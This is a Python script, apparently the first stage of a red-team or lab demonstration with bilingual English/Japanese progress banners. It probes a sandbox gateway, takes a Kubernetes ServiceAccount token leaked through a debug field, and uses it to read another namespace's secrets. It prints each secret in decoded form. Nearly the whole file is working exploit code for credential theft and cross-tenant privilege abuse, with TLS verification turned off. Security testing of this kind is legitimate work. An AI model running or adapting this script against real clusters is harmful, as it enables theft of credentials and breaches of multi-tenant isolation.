#!/usr/bin/env python3
import os
import sys
import json
import base64
import urllib3
import requests

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from progress_hud import eva_progress

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_IP = "192.168.1.168"
GATEWAY_URL = f"http://{TARGET_IP}:30801"
K8S_API_URL = f"https://{TARGET_IP}:6443"

def run_stage_1():
    # Step 1: Probe Inventor Co-Creation Sandbox / 発明者サンドボックスの偵察
    eva_progress(
        "🧱",
        "STAGE 1: A.T. FIELD RECON (MULTI-TENANT SANDBOX)",
        "第1段階：A.T.フィールド偵察（マルチテナント境界調査）",
        "Probing External Inventor Gateway & Mapping Microservices",
        "外部パートナーゲートウェイを調査しマイクロサービスを特定中",
        duration=1.6
    )

    try:
        resp = requests.get(f"{GATEWAY_URL}/api/v1/sandbox/status", timeout=5)
        resp.raise_for_status()
    except Exception as e:
        print(f"❌ [ERROR] Gateway unreachable / ゲートウェイ接続失敗: {e}")
        sys.exit(1)

    data = resp.json()
    tenant = data.get("tenant")
    endpoints = data.get("connected_microservices", [])
    sa_token = data.get("debug_k8s_sa_token", "")

    print(f"🏢 [TENANT / テナント]: {tenant}")
    print(f"🗺️ [DISCOVERED ROUTES / 発見されたAPIルート]:")
    for ep in endpoints:
        print(f"   🔹 {ep}")

    if not sa_token or sa_token == "NO_TOKEN":
        print("⚠️ [WARNING] No Kubernetes ServiceAccount token leaked / トークン未検出")
        sys.exit(1)

    print(f"\n🔑 [LEAKED K8S TOKEN / 漏洩したK8sトークン]: {sa_token[:36]}...[REDACTED]")

    # Step 2: Test Cross-Namespace RBAC Isolation / クロス名前空間RBAC分離の検証
    eva_progress(
        "🚨",
        "STAGE 1B: CROSS-NAMESPACE RBAC BOUNDARY AUDIT",
        "第1段階B：クロス名前空間RBAC権限境界の監査",
        "Testing ServiceAccount Scope Against Core Identity Namespace",
        "サービスアカウント権限でコア認証名前空間へのアクセスを検証中",
        duration=1.6
    )

    headers = {"Authorization": f"Bearer {sa_token}"}
    try:
        k8s_resp = requests.get(
            f"{K8S_API_URL}/api/v1/namespaces/woven-core-identity/secrets",
            headers=headers,
            verify=False,
            timeout=5
        )
        if k8s_resp.status_code == 200:
            secrets_data = k8s_resp.json()
            items = secrets_data.get("items", [])
            print("💥 [BREACH CONFIRMED / 境界突破確認]: Multi-Tenant Isolation Failed! / マルチテナント分離の欠陥を検出！")
            for item in items:
                sec_name = item.get("metadata", {}).get("name")
                print(f"   📂 [SECRET FOUND / 機密シークレット発見]: {sec_name} (namespace: woven-core-identity)")
                raw_data = item.get("data", {})
                for k, v in raw_data.items():
                    decoded_val = base64.b64decode(v).decode("utf-8", errors="ignore")
                    print(f"      🔐 {k}: {decoded_val}")
        else:
            print(f"🛡️ [BLOCKED / 遮断]: Kubernetes RBAC denied cross-namespace read (HTTP {k8s_resp.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"🛡️ [NETWORK BLOCKED / 通信遮断]: K8s API (:6443) unreachable due to firewall/network policy ({type(e).__name__})")

if __name__ == "__main__":
    run_stage_1()
